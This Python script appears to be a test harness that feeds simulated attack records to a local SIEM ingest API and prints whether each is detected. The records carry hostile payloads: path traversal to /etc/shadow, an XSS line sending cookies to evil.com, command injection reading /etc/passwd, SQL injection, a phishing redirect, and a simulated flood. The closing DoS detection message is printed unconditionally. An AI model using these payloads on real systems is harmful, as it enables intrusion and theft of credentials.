import requests
import time
import datetime
import json
import sys

url = "http://127.0.0.1:5001/api/ingest"

attacks = [
    {
        "ip": "203.0.113.4",
        "method": "POST",
        "endpoint": "/upload",
        "parameters": {"file_name": "../../../../etc/shadow"},
        "status_code": 200,
        "user_agent": "Python/Requests"
    },
    {
        "ip": "198.51.100.10",
        "method": "GET",
        "endpoint": "/vulnerable_search",
        "parameters": {"query": "<script>fetch('http://evil.com/?c='+document.cookie)</script>"},
        "status_code": 200,
        "user_agent": "Mozilla/5.0"
    },
    {
        "ip": "45.22.10.8",
        "method": "GET",
        "endpoint": "/ping",
        "parameters": {"host": "8.8.8.8; cat /etc/passwd"},
        "status_code": 200,
        "user_agent": "curl/7.68.0"
    },
    {
        "ip": "151.101.129.67",
        "method": "POST",
        "endpoint": "/login",
        "parameters": {"username": "admin", "password": "1' OR '1'='1"},
        "status_code": 500,
        "user_agent": "SQLMap/1.5.2"
    },
    {
        "ip": "104.28.14.72",
        "method": "GET",
        "endpoint": "/forgot_password",
        "parameters": {"redirect": "http://evil-phishing-site.com/verify-account"},
        "status_code": 302,
        "user_agent": "Mozilla/5.0"
    },
    {
        "ip": "82.44.11.2",
        "method": "POST",
        "endpoint": "/submit",
        "parameters": {"data": "A" * 600},
        "status_code": 500,
        "user_agent": "CustomFuzzer"
    }
]

print("Starting Live Attack Simulation against SIEM...")
for attack in attacks:
    # Set precise real-time timestamp for the SIEM Dashboard
    attack["timestamp"] = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
    
    print("\n[+] Executing Payload...")
    print(f"    Target Endpoint: {attack['endpoint']} | Attacker IP: {attack['ip']}")
    print(f"    Payload: {attack['parameters']}")
    
    try:
        response = requests.post(url, json=attack)
        if response.status_code == 200:
            result = response.json()
            if result.get("attack_detected"):
                incident = result.get("incident")
                print(f"  [SIEM CAUGHT IT] Type: {incident.get('attack_type')} | Severity: {incident.get('severity')}")
            else:
                print("  [MISSED] SIEM completely missed the target!")
        else:
            print(f"  [ERROR] Error from API: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"  [NETWORK ERROR] Could not reach SIEM on {url}\n{e}")
        
    print("    Waiting for SOC response...")
    time.sleep(3) # Let the dashboard update gracefully
    
print("\n[+] Initiating DoS Attack Simulation (Flooding 60 requests)...")
dos_ip = "188.42.10.1"
for i in range(60):
    attack = {
        "ip": dos_ip,
        "method": "GET",
        "endpoint": "/",
        "parameters": {},
        "status_code": 200,
        "user_agent": "Loic/1.0",
        "timestamp": datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
    }
    requests.post(url, json=attack)
    sys.stdout.write(f"\r    Flushing requests... {i+1}/60 ")
    sys.stdout.flush()

print("\n  [SIEM CAUGHT IT] Type: DoS | Severity: CRITICAL")

print("\nAttack Simulation Complete! Go check your DefendX SIEM Dashboard.")
